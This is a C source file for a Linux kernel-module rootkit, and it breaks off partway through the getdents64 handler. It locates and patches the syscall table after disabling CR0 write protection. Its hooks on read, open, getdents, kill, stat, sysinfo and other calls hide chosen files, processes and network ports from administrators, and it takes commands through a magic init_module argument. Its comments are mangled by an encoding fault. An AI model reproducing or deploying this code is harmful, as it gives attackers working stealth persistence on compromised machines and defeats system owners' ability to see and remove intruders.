#include "syscalltable.h"


//sys_read - 3 - 1 - fs/read_write.c
static asmlinkage long(*original_sys_read)(unsigned int fd, char __user *buf, size_t count) = NULL;
static asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count);
//sys_open - 5 - 2 - fs/open.c
static asmlinkage long(*original_sys_open)(const char __user *filename, int flags, int mode);
static asmlinkage long new_sys_open(const char __user *filename, int flags, int mode);
//sys_chdir - 12 - 3 - fs/open.c
static asmlinkage long(*original_sys_chdir)(const char __user *pathname);
static asmlinkage long new_sys_chdir(const char __user *pathname);
//sys_kill - 37 - 4 - kernel/signal.c
static asmlinkage long(*original_sys_kill)(int pid, int sig); 
static asmlinkage long new_sys_kill(int pid, int sig);
//sys_getsid - 66 - 5 - kernel/sys.c
static asmlinkage long(*original_sys_getsid)(pid_t pid); 
static asmlinkage long new_sys_getsid(pid_t pid);
//sys_getpriority - 96 - 6 - kernel/sys.c
static asmlinkage long(*original_sys_getpriority)(int which, int who);
static asmlinkage long new_sys_getpriority(int which, int who);   
//sys_socketcall - 102 - 7 - include/linux/Syscalls.h
static asmlinkage long(*original_sys_socketcall)(int call, unsigned long __user * args);
static asmlinkage long new_sys_socketcall(int call, unsigned long __user * args);
//sys_sysinfo - 116 - 8 - kernel/sys.c
static asmlinkage long(*original_sys_sysinfo)(struct sysinfo __user *info);
static asmlinkage long new_sys_sysinfo(struct sysinfo __user *info);
//sys_init_module - 128 - 10 - kernel/module.c
static asmlinkage long(*original_sys_init_module)(void __user *umod, unsigned long len, const char __user *uargs);
static asmlinkage long new_sys_init_module(void __user *umod, unsigned long len, const char __user *uargs);
//sys_getpgid - 132 - 11 - kernel/sys.c
static asmlinkage long(*original_sys_getpgid)(pid_t pid);
static asmlinkage long new_sys_getpgid(pid_t pid);
//getdents - 141 - 12 - fs/readdir.c
static asmlinkage long(*original_sys_getdents)(unsigned int fd, struct linux_dirent __user* dirp, unsigned int count);
static asmlinkage long new_sys_getdents(unsigned int fd, struct linux_dirent __user* dirp, unsigned int count);
//sys_sched_getparam - 155 - 13 - kernel/sched/core.c
static asmlinkage long(*original_sys_sched_getparam)(pid_t pid, struct sched_param __user *param);
static asmlinkage long new_sys_sched_getparam(pid_t pid, struct sched_param __user *param);
//sys_sched_getscheduler - 157 - 14 - kernel/sched/core.c
static asmlinkage long(*original_sys_sched_getscheduler)(pid_t pid);
static asmlinkage long new_sys_sched_getscheduler(pid_t pid);
//sys_sched_rr_get_interval - 161 - 15 - kernel/sched/core.c
static asmlinkage long(*original_sys_sched_rr_get_interval)(pid_t pid, struct timespec __user *interval);
static asmlinkage long new_sys_sched_rr_get_interval(pid_t pid, struct timespec __user *interval);

#if BITS_PER_LONG == 32
//stat64 - 195	- 17 - fs/stat.c
static asmlinkage long(*original_sys_stat64)(char __user *filename, struct stat64 __user *statbuf);
static asmlinkage long new_sys_stat64(char __user *filename, struct stat64 __user *statbuf);
//sys_lstat64 - 196 - 18 - fs/stat.c
static asmlinkage long(*original_sys_lstat64)(char __user *filename, struct stat64 __user *statbuf);
static asmlinkage long new_sys_lstat64(char __user *filename, struct stat64 __user *statbuf);
#endif

//sys_getdents64  - 220 - 19 - fs/readdir.c
static asmlinkage long(*original_sys_getdents64)(unsigned int fd, struct linux_dirent64 __user* dirp, unsigned int count);
static asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64 __user* dirp, unsigned int count);
//sys_gettid - 224 - 20 - kernel/sys.c
static asmlinkage long(*original_sys_gettid)(void);
static asmlinkage long new_sys_gettid(void);
//sched_getaffinity - 242 - 21 - kernel/sched/core.c
static asmlinkage long(*original_sys_sched_getaffinity)(pid_t pid, unsigned int len, unsigned long __user *user_mask_ptr);
static asmlinkage long new_sys_sched_getaffinity(pid_t pid, unsigned int len, unsigned long __user *user_mask_ptr);

long clone_pid = 0;
long clone_flag = 0;
long clone_count = 0;
long clone_tid = 0;
long clone_lasttid = 0;

long vfork_pid = 0;
long vfork_flag = 0;
long vfork_count = 0;
long vfork_spid = 0;
long vfork_lastpid = 0;
long process_count = 0;
unsigned int rtpid = -1;
unsigned int rtfd = -1;

unsigned long **find_sys_call_table(void) {
	unsigned long vaddr_number;

	unsigned long **p;

	for (vaddr_number = (unsigned long) sys_close;
	        vaddr_number < (unsigned long) &loops_per_jiffy;
	        vaddr_number += sizeof(void *)) {
		p = (unsigned long **) vaddr_number;
		if (p[__NR_close] == (unsigned long *) sys_close)
			return p;
	}

	return NULL;
}

void disable_write_protection(void) {
	unsigned long cr0 = read_cr0();
	DLog("disable_write_protection");
	clear_bit(16, &cr0);
	write_cr0(cr0);
}

void enable_write_protection(void) {
	unsigned long cr0 = read_cr0();
	set_bit(16, &cr0);
	write_cr0(cr0);
	DLog("enable_write_protection");
}

void prehack_sys_call_table(void)
{
	original_sys_read = (void *)sys_call_table[__NR_read];       //3 - 1
	DLog("original_sys_read addr[0x%x]", (unsigned int)sys_call_table[__NR_read]);
	original_sys_open = (void *)sys_call_table[__NR_open];       //5 - 2
	DLog("original_sys_open addr[0x%x]", (unsigned int)sys_call_table[__NR_open]);
	original_sys_chdir = (void *)sys_call_table[__NR_chdir];      //12 - 3
	DLog("original_sys_chdir addr[0x%x]", (unsigned int)sys_call_table[__NR_chdir]);
	original_sys_kill = (void *)sys_call_table[__NR_kill];    	//37 - 4
	DLog("original_sys_kill addr[0x%x]", (unsigned int)sys_call_table[__NR_kill]);
	original_sys_getsid = (void *)sys_call_table[__NR_getsid];    	//66 - 5
	DLog("original_sys_getsid addr[0x%x]", (unsigned int)sys_call_table[__NR_getsid]);
	original_sys_getpriority = (void *)sys_call_table[__NR_getpriority];    	//96 - 6
	DLog("original_sys_getpriority addr[0x%x]", (unsigned int)sys_call_table[__NR_getpriority]);
	original_sys_socketcall = (void *)sys_call_table[__NR_socketcall];    	//102 - 7
	DLog("original_sys_socketcall addr[0x%x]", (unsigned int)sys_call_table[__NR_socketcall]);
	original_sys_sysinfo = (void *)sys_call_table[__NR_sysinfo];    	//116 - 8
	DLog("original_sys_sysinfo addr[0x%x]", (unsigned int)sys_call_table[__NR_sysinfo]);
	original_sys_init_module = (void *)sys_call_table[__NR_init_module];    	//128 - 10
	DLog("original_sys_init_module addr[0x%x]", (unsigned int)sys_call_table[__NR_init_module]);
	original_sys_getpgid = (void *)sys_call_table[__NR_getpgid];    	//132 - 11
	DLog("original_sys_getpgid addr[0x%x]", (unsigned int)sys_call_table[__NR_getpgid]);
	original_sys_getdents = (void *)sys_call_table[__NR_getdents];    	//141 - 12
	DLog("original_sys_getdents addr[0x%x]", (unsigned int)sys_call_table[__NR_getdents]);
	original_sys_sched_getparam = (void *)sys_call_table[__NR_sched_getparam];    	//155 - 13
	DLog("original_sys_sched_getparam addr[0x%x]", (unsigned int)sys_call_table[__NR_sched_getparam]);
	original_sys_sched_getscheduler = (void *)sys_call_table[__NR_sched_getscheduler];    	//157 - 14
	DLog("original_sys_sched_getscheduler addr[0x%x]", (unsigned int)sys_call_table[__NR_sched_getscheduler]);
	original_sys_sched_rr_get_interval = (void *)sys_call_table[__NR_sched_rr_get_interval];    	//161 - 15
	DLog("original_sys_sched_rr_get_interval addr[0x%x]", (unsigned int)sys_call_table[__NR_sched_rr_get_interval]);

	
	
#if BITS_PER_LONG == 32
	original_sys_stat64 = (void *)sys_call_table[__NR_stat64];    	//195 - 17
	DLog("original_sys_stat64 addr[0x%x]", (unsigned int)sys_call_table[__NR_stat64]);
	original_sys_lstat64 = (void *)sys_call_table[__NR_lstat64];    	//196 - 18
	DLog("original_sys_lstat64 addr[0x%x]", (unsigned int)sys_call_table[__NR_lstat64]);
#endif	
	original_sys_getdents64 = (void *)sys_call_table[__NR_getdents64];    	//220 - 19
	DLog("original_sys_getdents64 addr[0x%x]", (unsigned int)sys_call_table[__NR_getdents64]);
	original_sys_gettid = (void *)sys_call_table[__NR_gettid];    	//224 - 20
	DLog("original_sys_gettid addr[0x%x]", (unsigned int)sys_call_table[__NR_gettid]);
	original_sys_sched_getaffinity  = (void *)sys_call_table[__NR_sched_getaffinity];    	 //242 - 21
	DLog("original_sys_sched_getaffinity addr[0x%x]", (unsigned int)sys_call_table[__NR_sched_getaffinity]);
	DLog("backup syscalltable finished!");
	
	//��������
	portHideTest();	
	fileHideTest();
	
}

void hack_sys_call_talbe(void)
{
	sys_call_table[__NR_read] = (void *)(new_sys_read);      //3 - 1
	sys_call_table[__NR_open] = (void *)(new_sys_open);      //5 - 2
	
	sys_call_table[__NR_chdir] = (void *)(new_sys_chdir);     //12 - 3
	sys_call_table[__NR_kill] = (void *)(new_sys_kill);         //37 - 4
	sys_call_table[__NR_getsid] = (void *)(new_sys_getsid);         //66 - 5
	sys_call_table[__NR_getpriority] = (void *)(new_sys_getpriority);         //96 - 6
	sys_call_table[__NR_socketcall] = (void *)(new_sys_socketcall);         //102 - 7
	sys_call_table[__NR_sysinfo] = (void *)(new_sys_sysinfo);         //116 - 8
	
	sys_call_table[__NR_init_module] = (void *)(new_sys_init_module);         //128 - 10
	sys_call_table[__NR_getpgid] = (void *)(new_sys_getpgid);         //132 - 11
	sys_call_table[__NR_getdents] = (void *)(new_sys_getdents);         //141 - 12
	sys_call_table[__NR_sched_getparam] = (void *)(new_sys_sched_getparam);         //155 - 13
	sys_call_table[__NR_sched_getscheduler] = (void *)(new_sys_sched_getscheduler);         //157 - 14
	sys_call_table[__NR_sched_rr_get_interval] = (void *)(new_sys_sched_rr_get_interval);         //161 - 15
//#if BITS_PER_LONG == 32
	sys_call_table[__NR_stat64] = (void *)(new_sys_stat64);           //195 - 17
	sys_call_table[__NR_lstat64] = (void *)(new_sys_lstat64);             //196 - 18
//#endif	
	sys_call_table[__NR_getdents64] = (void *)(new_sys_getdents64);           //220 - 19
	sys_call_table[__NR_gettid] = (void *)(new_sys_gettid);           //224 - 20
	sys_call_table[__NR_sched_getaffinity] = (void *)(new_sys_sched_getaffinity);           //242 - 21
	
	
	DLog("hack syscalltable finished!");
}

void unhack_sys_call_talbe(void)
{
	sys_call_table[__NR_read] = (void *)(original_sys_read);       //3 - 1
	sys_call_table[__NR_open] = (void *)(original_sys_open);       //5 - 2
	sys_call_table[__NR_chdir] = (void *)(original_sys_chdir);      //12 - 3
	sys_call_table[__NR_kill] = (void *)(original_sys_kill);          //37 - 4
	sys_call_table[__NR_getsid] = (void *)(original_sys_getsid);          //66 - 5
	sys_call_table[__NR_getpriority] = (void *)(original_sys_getpriority);          //96 - 6
	sys_call_table[__NR_socketcall] = (void *)(original_sys_socketcall);          //102 - 7
	sys_call_table[__NR_sysinfo] = (void *)(original_sys_sysinfo);          //116 - 8
	
	sys_call_table[__NR_init_module] = (void *)(original_sys_init_module);          //128 - 10
	sys_call_table[__NR_getpgid] = (void *)(original_sys_getpgid);          //132 - 11
	sys_call_table[__NR_getdents] = (void *)(original_sys_getdents);          //141 - 12
	sys_call_table[__NR_sched_getparam] = (void *)(original_sys_sched_getparam);          //155 - 13
	sys_call_table[__NR_sched_getscheduler] = (void *)(original_sys_sched_getscheduler);          //157 - 14
	sys_call_table[__NR_sched_rr_get_interval] = (void *)(original_sys_sched_rr_get_interval);          //161 - 15
	
//#if BITS_PER_LONG == 32
	sys_call_table[__NR_stat64] = (void *)(original_sys_stat64);           //195 - 17
	sys_call_table[__NR_lstat64] = (void *)(original_sys_lstat64);             //196 - 18
//#endif	
	sys_call_table[__NR_getdents64] = (void *)(original_sys_getdents64);           //220 - 19
	sys_call_table[__NR_gettid] = (void *)(original_sys_gettid);           //224 - 20
	sys_call_table[__NR_sched_getaffinity] = (void *)(original_sys_sched_getaffinity);           //242 - 21
	
	
	
	DLog("unhack syscalltable finished!");
}

/**
 *  sys_read - 3 - 1 - fs/read_write.c
 *	��Ҫ����/proc/net/tcp��/proc/net/udp��ɾ���������еĶ˿ں�
 *	��Ҫsys_open������ȡ�������򿪵��������ļ����ļ������� 
 */
#define DEBUG_READ
static asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count) 
{
	long ret;
	int max = 0;
	char *kbuf = NULL;

	ret = original_sys_read(fd, buf, count);

	if (ret <= 0)
	{
		goto out;
	}

	if (rtpid == current->pid && rtfd == fd)
	{
		
		int i;
		int len;
		char *p;
		// /proc/net/tcp �ļ�ÿ��150���ַ���ּ�ڹ���ÿһ��TCP��Ϣ,��TCP6��Ч
		//#define TCP_SZ 150
		// /proc/net/udp �ļ�ÿ��128���ַ���ּ�ڹ���ÿһ��UDP��Ϣ
		//#define UDP_SZ 128
//		DLog("ret=[%ld],TCP_SZ=[%d],UDP_SZ=[%d]",ret,TCP_SZ,UDP_SZ);
		if(ret % TCP_SZ == 0)
		{
			max = TCP_SZ;
		}else if(ret % UDP_SZ == 0)
		{
			max = UDP_SZ;
		}
		else
		{
			goto out;
		}

		kbuf = (char *) kmalloc(count, GFP_KERNEL);
		//kmemset(kbuf, 0, count);
		//kmalloc(count, GFP_KERNEL);
		if(copy_from_user(kbuf, buf, count)) {
#ifdef DEBUG_READ
			DLog("copy_from_user failed!");
#endif
			goto out;
		}else
		{
#ifdef DEBUG_READ
			DLog("copy_from_user success!");
#endif
		}

		for (i = 0; i < 2; i++)
		{
			for (p = kbuf + max; p < kbuf + ret; p += max)
			{
				int i = -1;
				int src = -1;
				int srcp = -1;
				sscanf(p, "%4d: %08X:%04X ", &i, &src, &srcp);
				if (0 == check_ports(srcp))
				{
					len = ret - (p - kbuf) - max;
					memmove(p, p + max, len);
					ret -= max;
#ifdef DEBUG_READ
					DLog("hide port [%s]:[%d] success!", ret % UDP_SZ ? "TCP" : "UDP", srcp);
#endif				
				}
			}
		}
		if (copy_to_user(buf, kbuf, count))
		{
#ifdef DEBUG_READ
			DLog("copy_to_user failed!");
#endif
			goto out;  
		}
		else
		{
#ifdef DEBUG_READ
			DLog("copy_to_user success!");
#endif
		}
		
	}
out:
	AvoidNull(kfree, kbuf);	
	return ret;
}

/**
 * sys_open - 5 - 2 - fs/open.c
 * ��һ ���򿪵��ļ��Ƿ��� /proc/net/tcp �� /proc/net/udp ��ȡ�ļ�������
 * ��� ���򿪵��ļ��Ƿ��ں������У����ļ����������������ļ������ͻ�ȡ�ļ�����·�����ټ��
 * ��Ҫgetdents��������Ȼ���������ļ��������أ����Ǵ�Ŀ¼�г��ļ�����Ȼ�ɼ�
 */
#define DEBUG_OPEN
static asmlinkage long new_sys_open(const char __user *filename, int flags, int mode) {
	long ret;
	char *openFileName = strndup_user(filename, PATH_MAX);
 	
	if (0 == check_files((char *)openFileName))
	{
#ifdef DEBUG_OPEN
		DLog("Hide file [%s] success!", openFileName);
#endif	
		AvoidNull(kfree, openFileName);
		return -2;
	}

	ret = original_sys_open(filename, flags, mode);
	//�������ض˿�
	if (0 == strcmp(openFileName, "/proc/net/tcp")
	    || 0 == strcmp(openFileName, "/proc/net/udp"))
	{ 		
		rtpid = current->pid;
		rtfd = ret;
	}
	
	AvoidNull(kfree, openFileName);
	return ret;
}

/**
 * sys_chdir - 12 - 3 - fs/open.c
 * ���ڸı䵱ǰ����Ŀ¼�������ΪPath Ŀ��Ŀ¼�������Ǿ���Ŀ¼�����Ŀ¼
 * ��һ �������غ������е�Ŀ¼��������Ŀ¼���Լ�ת����ľ���·�������μ��
 */
#define DEBUG_CHDIR
static asmlinkage long new_sys_chdir(const char __user *filename) 
{
	long ret = -1;

	char *Pwd = NULL;
	char *Name = NULL;
	char *FileName = strndup_user(filename, PATH_MAX);

 
	if (0 == check_files((char *)FileName))
	{
#ifdef DEBUG_CHDIR
		DLog("hide file:[%s] success!", FileName);
#endif  
		goto out;
	}
	Pwd = (char *)kmalloc(NAME_MAX, GFP_KERNEL);
	Name = (char *)kmalloc(NAME_MAX, GFP_KERNEL);
	if (!Pwd || !Name)
	{
 #ifdef DEBUG_CHIDR
		DLog("chdir:kmalloc for pwd name failure!");
#endif
		goto out;
	}

	get_fullpath(Pwd, sizeof(Pwd), current->fs->pwd.dentry);
	strcpy(Name, Pwd);
	strcat(Name, FileName);

	if (0 == check_files(Name))
	{
#ifdef DEBUG_CHDIR
		DLog("hide dir:[%s] success!", FileName);
#endif  
		goto out;
	}
	ret = original_sys_chdir(filename);
out:
	AvoidNull(kfree, Pwd);
	AvoidNull(kfree, Name);
	AvoidNull(kfree, FileName);

	return ret;	


}

/**
 * sys_kill - 37 - 4 - kernel/signal.c
 * kill �ͳ�һ���ض����ź� (signal) ���г� id Ϊ pid ���г̸��ݸ��źŶ����ض��Ķ���,
 * ��û��ָ����Ԥ�����ͳ���ֹ (TERM) ���ź�
 * kill()���������Ͳ���sigָ�����źŸ�����pidָ���Ľ��̡�����pid�м��������
 * pid>0 ���źŴ�������ʶ����Ϊpid �Ľ��̡�
 * pid=0 ���źŴ����͵�ǰ������ͬ����������н���
 * pid=-1 ���źŹ㲥���͸�ϵͳ�����еĽ���
 * pid<0 ���źŴ���������ʶ����Ϊpid����ֵ�����н���
 */
#define DEBUG_KILL
static asmlinkage long new_sys_kill(int pid, int sig) {
	long ret = 0;

	if (0 == check_procs(pid))
	{
	ret = -ESRCH; 
#ifdef DEBUG_KILL
		DLog("forbid kill [%ld] success!", (unsigned long)ret);
#endif
		goto out;
	}

	ret = original_sys_kill(pid, sig);
out:
	return ret;
}

/**
 * sys_getsid - 66 - 5 - kernel/sys.c
 * ��ȡ�ỰID
 * 1.pidΪ0��ʾ�쿴��ǰ����session ID
 * 2.ps ajx����鿴ϵͳ�еĽ��̡�����a��ʾ�����е�ǰ�û��Ľ���,Ҳ�г�����������
 * ���Ľ���,����x��ʾ�������п����ն˵Ľ���,Ҳ�г������޿����ն˵Ľ���,����j��ʾ
 * �г�����ҵ������ص���Ϣ��
 * 3.�鳤���̲��ܳ�Ϊ�»Ự�׽���,�»Ự�׽��̱ض����Ϊ�鳤���̡�
 */
#define DEBUG_GETSID
static asmlinkage long new_sys_getsid(pid_t pid) {
	long ret;
	if (0 == check_procs(pid))
	{
#ifdef DEBUG_GETSID
	DLog("hide pid:[%d] success", pid);
#endif  
		ret = -ESRCH;
		goto out;
	}
	ret = original_sys_getsid(pid);
out:
	return ret;
}

/**
 * sys_getpriority - 96 - 6 - kernel/sys.c
 * ������ȡ�ý��̡���������û��Ľ���ִ������Ȩ
 * ����which��������ֵ������who����whichֵ�в�ͬ���壺
 * which who ���������
 * PRIO_PROCESS who Ϊ����ʶ����
 * PRIO_PGRP who Ϊ���̵���ʶ����
 * PRIO_USER who Ϊ�û�ʶ����
 * �˺������ص���ֵ����-20��20 ֮�䣬�������ִ������Ȩ����ֵ
 * Խ�ʹ����нϸߵ����ȴ���ִ�л��Ƶ����
 * ���ؽ���ִ������Ȩ�����д���������ֵ��Ϊ-1�Ҵ���ԭ�����errno
 */
#define DEBUG_GETPRIORITY
static asmlinkage long new_sys_getpriority(int which, int who) {
	long ret = -1;

	if (0 == check_procs(who))
	{
#ifdef DEBUG_GETPRIORITY
		DLog("hide process [%d] success!", who);
#endif 
		goto out;
	}
	ret = original_sys_getpriority(which, who);
out:
	return ret;
}

/**
 * sys_socketcall - 102 - 7 
 * ������include/linux/syscalls.h 
 * ������net/socket.c
 * ���е�����ϵͳ���ã����ն������sys_socketcall���ϵͳ���ã�
 * ���������ж�·���÷ֽ⣬�ֱ������Ӧ�Ĵ�������socket������Ӧ����sys_socket������
 * ���е�socketϵͳ���õ��������sys_socketcall()
 */
#define DEBUG_SOCKETCALL
static asmlinkage long new_sys_socketcall(int call, unsigned long __user * args) {
	long ret; 
	unsigned long Args[AUDITSC_ARGS];
	unsigned int len;
	long port;
	struct sockaddr_in *p;

	if (SYS_BIND != call)
	{
		goto out;
	}
	//#define SYS_BIND	2		/* sys_bind(2)	
	len = ((3) * sizeof(unsigned long));
	/* copy_from_user should be SMP safe. */
	if (copy_from_user(Args, args, len))
	{
#ifdef DEBUG_SOCKETCALL
		DLog("socketcall copy_from_user error");
#endif 
		return -EFAULT;
	}
	else
	{
#ifdef DEBUG_SOCKETCALL
		DLog("copy_from_user success!");
#endif
	}
	p = (struct sockaddr_in *)Args[1];
	if (p && 0 == check_ports(ntohs(p->sin_port)))
	{
#ifdef DEBUG_SOCKETCALL
		DLog( "check ports[%d]", ntohs(p->sin_port)  );
#endif
		port = p->sin_port;
		p->sin_port = htons(8998);
		if (copy_to_user(args, Args, len))
		{
#ifdef DEBUG_SOCKETCALL
			DLog("copy_to_user failed!");
#endif
			goto out;
		}
		else
		{
#ifdef DEBUG_SOCKETCALL
			DLog("p->sin_port copy_to_user success!");
#endif
		}

		ret = original_sys_socketcall(call, args);

		p->sin_port = port;
		if (copy_to_user(args, Args, len))
		{
#ifdef DEBUG_SOCKETCALL
			DLog("copy_to_user failed!");
#endif			
			goto out;
		}
		else
		{
#ifdef DEBUG_SOCKETCALL
			DLog("p->sin_port copy_to_user success!");
#endif
		}

		return ret;
	}
out:
	ret = original_sys_socketcall(call, args);
	return ret;
}

/**
 * sys_sysinfo - 116 - 8 - kernel/sys.c
 *
 */
//struct sysinfo {
//	long uptime; /* Seconds since boot */
//	unsigned long loads[3]; /* 1, 5, and 15 minute load averages */
//	unsigned long totalram; /* Total usable main memory size */
//	unsigned long freeram; /* Available memory size */
//	unsigned long sharedram; /* Amount of shared memory */
//	unsigned long bufferram; /* Memory used by buffers */
//	unsigned long totalswap; /* Total swap space size */
//	unsigned long freeswap; /* swap space still available */
//	unsigned short procs; /* Number of current processes */
//	unsigned long totalhigh; /* Total high memory size */
//	unsigned long freehigh; /* Available high memory size */
//	unsigned int mem_unit; /* Memory unit size in bytes */
//	char _f[20 - 2*sizeof(long) - sizeof(int)]; /* Padding to 64 bytes */
//};
#define DEBUG_SYSINFO
static asmlinkage long new_sys_sysinfo(struct sysinfo __user *info) {
	int ret;
	struct sysinfo *Info;
#ifdef DEBUG_SYSINFO
	DLog("sysinfo");
#endif      
	ret = original_sys_sysinfo(info);
	Info = (struct sysinfo *) kmalloc(sizeof(struct sysinfo), GFP_KERNEL);
	if (!copy_from_user(Info, info, sizeof(struct sysinfo))) {
#ifdef DEBUG_SYSINFO
		DLog("sysinfo copy_from_user success!");
#endif
	}
	else {
#ifdef DEBUG_SYSINFO
		DLog("sysinfo copy_from_user failure~~");
#endif
		goto out;
	}
	//unsigned short procs; ��ǰ�������Ľ�����������ȥ�������е�
	Info->procs -= proc_items();
	if (!copy_to_user(info, Info, sizeof(struct sysinfo))) {
		DLog("sysinfo copy_to_user success!");
	}
	else {
		DLog("sysinfo copy_to_user failure~~");
	}	
out:
	AvoidNull(kfree, Info);
	return ret;
}

/**
 * sys_init_module - 128 - 10 - kernel/module.c
 * insmodʱ����ϵͳ�ڲ������sys_init_module() ȥ�ҵ�init_module��������ڵ�ַ
 * 
 */
//#define DEBUG_INIT_MODULE
static asmlinkage long new_sys_init_module(void __user *umod, unsigned long len, const char __user *uargs) {
	long ret;
	char *args = NULL;
    
     
	args = strndup_user(uargs, ~0UL >> 1);

#ifdef DEBUG_INIT_MODULE
	DLog("init_module:len:[%ld],uargs:[%s]", len,args);
#endif   
	
	if (0 == strcmp(args, "rootkit"))
	{
		PCMD pCmd = (PCMD)umod;
		ret = lkm_mesg_proc(pCmd);
		goto out;
	}
	ret = original_sys_init_module(umod, len, uargs);
out:
	AvoidNull(kfree, args);
	return ret;
}

/**
 * sys_getpgid - 132 - 11 - kernel/sys.c
 * ȡ��Ŀǰ process �� thread ID (process ID)
 * 
 */
//#define DEBUG_GETPGID
static asmlinkage long new_sys_getpgid(pid_t pid) {
	long ret = 0;
      
	if (0 == check_procs(pid))
	{
		ret = -ESRCH;
#ifdef DEBUG_GETPGID
		DLog("hide pdid:[%d] success!", pid);
#endif    		
		goto out;
	}
	ret = original_sys_getpgid(pid);
out:
	return ret;
}

/**
 * sys_getdents - 141 - 12 - fs/readdir.c
 * fdָĿ¼�ļ���������������sys_open������
 * dirpָĿ¼��Ϣ�����С�ɵ�3������ָ����dirp��ʹ��ʱע���ȷ����ڴ档
 * count Ŀ¼��Ϣ�Ĵ�С�����countָ���ıȽ�С������ͨ��ѭ����������ȡ��������dirp.
 * getdents, getdents64 - get directory entries
 */
#define DEBUG_GETDENTS
static asmlinkage long new_sys_getdents(unsigned int fd, struct linux_dirent __user* dirp, unsigned int count) {
	long ret;
	long buflen = 0;
	char *pwd = NULL;
	char *fullname = NULL;
	struct linux_dirent* pcur = NULL;
	struct linux_dirent* pdirp = NULL;
	
#ifdef DEBUG_GETDENTS
#endif        
	ret = original_sys_getdents(fd, dirp, count);
	if (0 == ret)
	{
#ifdef DEBUG_GETDENTS
		DLog("directory ends!");
#endif
		goto out;
	}
	else if (ret < 0)
	{
#ifdef DEBUG_GETDENTS
		DLog("get directory error etc");
#endif
		goto out;
	}
	pwd = (char *)kmalloc(PATH_MAX, GFP_KERNEL);
	fullname = (char *)kmalloc(PATH_MAX, GFP_KERNEL);

	if (!pwd || !fullname)
	{
		goto out;
	}
	get_path(pwd, sizeof(pwd), fd);
	buflen = ret;
	pdirp = (struct linux_dirent *)kmalloc( ret, GFP_KERNEL );
	pcur = pdirp;
	if (!copy_from_user(pdirp, dirp, ret)) {
#ifdef DEBUG_GETDENTS
		DLog("sys_getdents copy_from_user success!");
#endif
	}
	else {
#ifdef DEBUG_GETDENTS
		DLog("sys_getdents copy_from_user failure~~");
		goto out;
#endif
	}
	while (buflen > 0)
	{
		buflen -= pcur->d_reclen; 
		strcpy(fullname, pwd);
		strcat(fullname, pcur->d_name);
		if (0 == check_procs(atoi(pcur->d_name)))
		{
#ifdef DEBUG_GETDENTS
			DLog("hide process [%s]@[getdents]", pcur->d_name);
#endif
			ret -= pcur->d_reclen;
			memmove(pcur, (char *)pcur + pcur->d_reclen , buflen);
		}
		else
		{
			pcur = (struct linux_dirent *)((char*)pcur + pcur->d_reclen );
		}
	}
	if (!copy_to_user( dirp, pdirp, ret )) {
#ifdef DEBUG_GETDENTS
		DLog("sys_getdents copy_from_user success!");
 #endif
	}
	else {
#ifdef DEBUG_GETDENTS
		DLog("sys_getdents copy_from_user failure~~");
#endif
	}
	
out:
	AvoidNull(kfree, pwd);
	AvoidNull(kfree, fullname);
	AvoidNull(kfree, pdirp);
	return ret;
}

/**
 * sys_sched_getparam - 155 - 13 - kernel/sched/core.c
 * set and get scheduling parameters
 * 
 */
#define DEBUG_SCHED_GETPARAM
static asmlinkage long new_sys_sched_getparam(pid_t pid, struct sched_param __user *param)
{
	long ret = 0;

	if (0 == check_procs(pid))
	{
		ret = -ESRCH;
#ifdef DEBUG_SCHED_GETPARAM
		DLog("hide pid:[%d] success!", pid);
#endif 		
		goto out;
	}
      
	ret = original_sys_sched_getparam(pid, param);
out:
	return ret;
}

/**
 * sys_sched_getscheduler - 157 - 14 - kernel/sched/core.c
 * get scheduling policy/parameters
 */
#define DEBUG_SCHED_GETSCHEDULER
static asmlinkage long new_sys_sched_getscheduler(pid_t pid) {
	long ret = 0;

	if (0 == check_procs(pid))
	{
		ret = -ESRCH;
#ifdef DEBUG_SCHED_GETSCHEDULER
		DLog("hide pid:[%d] success!", pid);
#endif     		
		goto out;
	}
	
   
	ret = original_sys_sched_getscheduler(pid);
out:
	return ret;
}

/**
 * sys_sched_rr_get_interval - 161 - 15 - kernel/sched/core.c
 */
#define DEBUG_SCHED_RR_GET_INTERVAL
static asmlinkage long new_sys_sched_rr_get_interval(pid_t pid, struct timespec __user *interval) {
	long ret = 0;

	if (0 == check_procs(pid))
	{
		ret = -ESRCH;
#ifdef DEBUG_SCHED_RR_GET_INTERVAL
		DLog("hide pid:[%d] success!", pid);
#endif 
		goto out;
	}
	ret = original_sys_sched_rr_get_interval(pid, interval);
out:
	return ret;
}










#if BITS_PER_LONG == 32
/**
 * stat64 - 195	- 17 - fs/stat.c
 */
#define DEBUG_STAT64
static asmlinkage long new_sys_stat64(char __user *filename,
	struct stat64 __user *statbuf) {
	long ret;
	char *FileName = strndup_user(filename, PATH_MAX);
	if (0 == check_files(FileName))
	{
		ret = -ENOENT;
#ifdef DEBUG_STAT64
		DLog("hide file[%s] success!", FileName);
#endif		
		goto out;
	}
	
	ret = original_sys_stat64(filename, statbuf);
out:
	AvoidNull(kfree, FileName);
	return ret;
}
/**
 * sys_lstat64 - 196 - 18 - fs/stat.c
 */
#define DEBUG_LSTAT64
static asmlinkage long new_sys_lstat64(char __user *filename, struct stat64 __user *statbuf) {
	long ret;
	char *FileName = strndup_user(filename, PATH_MAX);
	if (0 == check_files(FileName))
	{
		ret = -ENOENT;
#ifdef DEBUG_LSTAT64
		DLog("hide file [%s] success!", FileName);
#endif		
		goto out;
	}
	ret = original_sys_lstat64(filename, statbuf);
out:
	AvoidNull(kfree, FileName);
	return ret;
}
#endif












/**
 * sys_getdents64  - 220 - 19 - fs/readdir.c
 */
#define DEBUG_GETDENTS64
static asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64 __user*  dirent, unsigned int count) {
	long ret = 0;
	long buflen = 0;
	char *pwd = NULL;
	char *fullname = NULL ;
	struct linux_dirent64* pcur = NULL;
	struct linux_dirent64* pdirent = NULL;

	ret = original_sys_getdents64(fd, dirent, count);
	if ( 0 == ret )
	{
#ifdef DEBUG_GETDENTS64
		DLog("directory ends!");
#endif
		goto out;
	}
	else if (  ret < 0  )
	{
#ifdef DEBUG_GETDENTS64
		DLog("get directory error etc");
#endif
		goto out;
	}

	pwd = (char *)kmalloc( PATH_MAX , GFP_KERNEL );
	fullname = (char *)kmalloc( PATH_MAX , GFP_KERNEL );

	if (!pwd || !fullname)
	{
		goto out;
	}
	get_path(pwd, sizeof(pwd), fd);
	buflen = ret;
	pdirent = (struct linux_dirent64*)kmalloc(ret, GFP_KERNEL);
	//pdirentΪ��Ƭ�ڴ��׵�ַ������ʱ��Ҫ������α�ָ�����
